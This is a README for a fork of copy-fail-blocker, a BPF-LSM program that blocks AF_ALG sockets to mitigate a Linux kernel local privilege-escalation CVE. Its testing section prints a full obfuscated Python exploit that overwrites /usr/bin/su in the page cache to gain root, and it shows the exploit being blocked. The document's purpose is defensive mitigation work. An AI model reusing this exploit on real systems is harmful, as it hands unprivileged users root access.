# about the fork

Basically bare-bones version removing the containerized deployment. Changes include adding bare-bones logging functionality and writing a loader in C.

To build and run:
```
make all
sudo ./loader
```

Dependencies include llvm and bpftool.

# testing
Run exploit:
```
[user@eo-md user]$ cat exp.py
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")[user@eo-md user]$ python3 exp.py
Traceback (most recent call last):
  File "/home/user/exp.py", line 9, in <module>
    while i<len(e):c(f,i,e[i:i+4]);i+=4
                   ~^^^^^^^^^^^^^^
  File "/home/user/exp.py", line 5, in c
    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
  File "/usr/lib64/python3.13/socket.py", line 233, in __init__
    _socket.socket.__init__(self, family, type, proto, fileno)
    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
PermissionError: [Errno 1] Operation not permitted
```

Loader output:
```
[user@eo-md copy-fail-blocker-local]$ sudo ./loader
BPF program loaded and map updated. Press Ctrl+C to exit.
May  1 16:41:31 AF_ALG socket creation blocked
```

# copy-fail-blocker

BPF-LSM mitigation for [CVE-2026-31431](https://copy.fail/) ("Copy Fail") and
similar privilege-escalation vulnerabilities that depend on userspace access
to the Linux kernel crypto API (`AF_ALG` / `algif_*`).

A small DaemonSet attaches a single BPF-LSM program to the `socket_create`
hook on every node. The program returns `-EPERM` for any `socket(AF_ALG, ...)`
call, regardless of process capabilities, namespace, or seccomp profile.

## Why

CVE-2026-31431 is a logic flaw in `algif_aead` that lets an unprivileged
local user perform a 4-byte page-cache write to any setuid binary, achieving
root with a 732-byte Python script. The exploit needs nothing but
`AF_ALG` + `splice()`, both of which are reachable from any unprivileged
process by default.

The proper fix is a kernel patch (mainline `a664bf3d603d`). Until that lands
in your distribution, the attack surface can be removed by preventing
userspace from ever opening an `AF_ALG` socket. Compared to alternatives:

| Mitigation                                  | Coverage                | Reboot? | Persists? |
| ------------------------------------------- | ----------------------- | ------- | --------- |
| `module_blacklist=algif_aead` (kernel arg)  | host-wide               | yes     | yes       |
| Custom kernel without `CRYPTO_USER_API_AEAD`| host-wide               | yes     | yes       |
| Per-pod custom seccomp profile              | only labelled workloads | no      | yes       |
| **copy-fail-blocker (this project)**        | **host-wide**           | **no**  | while DS runs |

This project is the no-reboot option. 

## How it works

`bpf/blocker.c` is a BPF-LSM program:

```c
SEC("lsm/socket_create")
int BPF_PROG(block_af_alg, int family, int type, int protocol,
             int kern, int ret)
{
    if (ret)
        return ret;
    if (family == AF_ALG)   // 38
        return -EPERM;
    return 0;
}
```

Requires a kernel built with `CONFIG_BPF_LSM=y` and `bpf` in the active LSM
stack (`lsm=...,bpf` on the kernel command line). 

## Install systemd unit
Systemd may be used to load bpf filter. You may use make install to install
filter in /usr/local/lib/bpf/copy_fail_blocker.o, install sysetmd unit file
copyfail-filter.service, reload systemd and load the filter.

## Limitations

- **Anyone with `CAP_BPF` and `CAP_SYS_ADMIN`** on the host can detach the
  hook. This is not a substitute for cluster-wide privilege restrictions.
- **Does not block `algif_skcipher` / `algif_hash` / etc.** The program
  rejects the entire `AF_ALG` family, but only `algif_aead` is currently
  known to be exploitable. If a future CVE needs a finer filter (e.g. hook
  `bind()` and inspect `salg_type`), this is straightforward to add.
- **No effect on processes that already hold an open `AF_ALG` socket.**
  Existing sockets keep working until closed.

## License

Apache License 2.0 — see [LICENSE](LICENSE).
